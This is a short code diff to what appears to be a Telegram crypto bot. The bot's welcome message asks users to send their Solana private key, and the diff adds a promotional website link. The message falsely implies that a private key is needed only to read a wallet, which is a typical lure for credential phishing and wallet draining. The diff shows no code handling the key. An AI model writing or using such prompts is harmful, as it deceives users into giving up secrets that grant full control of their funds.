@@ -31,7 +31,9 @@ bot.start((ctx) => {
 
 To continue, please send your Solana *private key* (in base58 format or JSON array). This will allow the bot to connect to your wallet and show your status.
 
-⚠️ Your key will be used to read your wallet only. Keep it safe.`,
+⚠️ Your key will be used to read your wallet only. Keep it safe.
+
+🌐 Visit our website: [magetoken.com.br](https://magetoken.com.br)`,
       parse_mode: 'Markdown'
     }
   );
